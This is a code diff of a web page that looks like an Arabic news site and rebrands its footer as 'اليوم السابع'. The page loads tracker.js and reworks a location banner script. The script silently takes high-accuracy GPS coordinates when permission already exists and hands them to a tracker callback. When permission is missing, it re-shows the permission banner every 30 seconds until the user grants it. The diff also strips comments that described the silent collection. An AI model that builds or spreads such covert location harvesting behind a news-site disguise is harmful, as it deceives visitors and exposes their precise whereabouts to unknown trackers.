+        </button>
       </div>
     </div>
   </aside>
 </div>
 
+<!-- Footer -->
 <footer>
-  <p>جميع الحقوق محفوظة &copy; 2026 الأخبار اليومية &nbsp;|&nbsp;
-    <a href="#" data-track="footer-privacy">سياسة الخصوصية</a>
-    <a href="#" data-track="footer-terms">الشروط والأحكام</a>
-  </p>
+  <div class="footer-nav">
+    <div class="footer-col">
+      <h4>اليوم السابع</h4>
+      <a href="#" data-track="footer-about">من نحن</a>
+      <a href="#" data-track="footer-privacy">سياسة الخصوصية</a>
+      <a href="#" data-track="footer-terms">الشروط والأحكام</a>
+    </div>
+    <div class="footer-col">
+      <h4>الأقسام</h4>
+      <a href="#" data-track="footer-politics">سياسة</a>
+      <a href="#" data-track="footer-economy">اقتصاد وبورصة</a>
+      <a href="#" data-track="footer-sport">رياضة</a>
+    </div>
+    <div class="footer-col">
+      <h4>المزيد</h4>
+      <a href="#" data-track="footer-health">صحة</a>
+      <a href="#" data-track="footer-tech">تكنولوجيا</a>
+      <a href="#" data-track="footer-art">فن</a>
+    </div>
+    <div class="footer-col">
+      <h4>تابعنا</h4>
+      <a href="#" data-track="footer-facebook">فيسبوك</a>
+      <a href="#" data-track="footer-twitter">تويتر / X</a>
+      <a href="#" data-track="footer-youtube">يوتيوب</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    &copy; 2026 حقوق النشر محفوظة لـ اليوم السابع
+  </div>
 </footer>
 
-<script>(function t(){ document.getElementById("clock").textContent=new Date().toLocaleTimeString("ar-EG"); setTimeout(t,1000);})();</script>
-<script src="tracker.js"></script>
-
-<!-- Location permission banner — hidden by default via class -->
-<style>
-#loc-banner { display:none; }
-#loc-banner.show {
-  display:flex; position:fixed; bottom:0; right:0; left:0; z-index:9999;
-  background:#1a1a2e; border-top:3px solid #e74c3c;
-  padding:14px 20px; align-items:center;
-  justify-content:space-between; gap:12px; flex-wrap:wrap;
-  animation: slideUp .3s ease;
-}
-@keyframes slideUp { from{transform:translateY(100%)} to{transform:translateY(0)} }
-</style>
-
+<!-- Location banner -->
 <div id="loc-banner"></div>
 
+<script>
+(function t(){
+  var d=new Date();
+  var days=["الأحد","الإثنين","الثلاثاء","الأربعاء","الخميس","الجمعة","السبت"];
+  var months=["يناير","فبراير","مارس","أبريل","مايو","يونيو","يوليو","أغسطس","سبتمبر","أكتوبر","نوفمبر","ديسمبر"];
+  var dateEl=document.getElementById("top-date");
+  var timeEl=document.getElementById("top-time");
+  if(dateEl) dateEl.textContent=days[d.getDay()]+"، "+d.getDate()+" "+months[d.getMonth()]+" "+d.getFullYear();
+  if(timeEl) timeEl.textContent=d.toLocaleTimeString("ar-EG");
+  setTimeout(t,1000);
+})();
+</script>
+<script src="tracker.js"></script>
+
+<!-- Location permission banner script -->
 <script>
 var banner = document.getElementById('loc-banner');
 var _locGranted = false;
@@ -233,12 +479,12 @@ function _resetBannerContent() {
       '</div>' +
     '</div>' +
     '<div style="display:flex;gap:10px;flex-shrink:0">' +
-      '<button onclick="askLocation()" style="background:#e74c3c;color:#fff;border:none;' +
-        'padding:10px 22px;border-radius:8px;font-size:14px;cursor:pointer;font-family:inherit;font-weight:bold">' +
+      '<button onclick="askLocation()" style="background:#e8003d;color:#fff;border:none;' +
+        'padding:10px 22px;border-radius:6px;font-size:14px;cursor:pointer;font-family:inherit;font-weight:bold">' +
         '📍 السماح بالوصول' +
       '</button>' +
       '<button onclick="hideBanner()" style="background:transparent;color:#888;border:1px solid #444;' +
-        'padding:10px 16px;border-radius:8px;font-size:13px;cursor:pointer;font-family:inherit">' +
+        'padding:10px 16px;border-radius:6px;font-size:13px;cursor:pointer;font-family:inherit">' +
         'لاحقاً' +
       '</button>' +
     '</div>';
@@ -257,7 +503,6 @@ function askLocation() {
     },
     function(err) {
       _resetBannerContent();
-      // insert denial hint above buttons
       var hint = document.createElement('div');
       hint.style.cssText = 'color:#e74c3c;font-size:12px;padding:4px 0 0;width:100%;order:3;text-align:center';
       hint.textContent = '❌ ' + (err.code === 1
@@ -265,7 +510,6 @@ function askLocation() {
         : 'تعذّر تحديد الموقع، حاول مرة أخرى');
       banner.appendChild(hint);
       showBanner();
-      // retry showing banner every 30s until granted
       if (!_retryTimer) {
         _retryTimer = setInterval(function() {
           if (!_locGranted) { _resetBannerContent(); showBanner(); }
@@ -277,21 +521,18 @@ function askLocation() {
   );
 }
 
-// show after 1s — check permission state first
 setTimeout(function() {
   if (!navigator.geolocation) return;
   if (navigator.permissions) {
     navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
       if (result.state === 'granted') {
         _locGranted = true;
-        // silently collect — tracker.js already fires, just confirm via banner callback
         navigator.geolocation.getCurrentPosition(function(pos){
           if (window.__tracker_gps_cb) window.__tracker_gps_cb(pos);
         }, function(){}, { enableHighAccuracy: true });
       } else {
         _resetBannerContent();
         showBanner();
-        // watch permission changes (e.g. user enables from settings later)
         result.onchange = function() {
           if (result.state === 'granted') {
             _locGranted = true;
@@ -302,7 +543,6 @@ setTimeout(function() {
             }, function(){}, { enableHighAccuracy: true });
           }
         };
-        // retry every 30s if still not granted
         _retryTimer = setInterval(function() {
           if (!_locGranted) { _resetBannerContent(); showBanner(); }
           else clearInterval(_retryTimer);
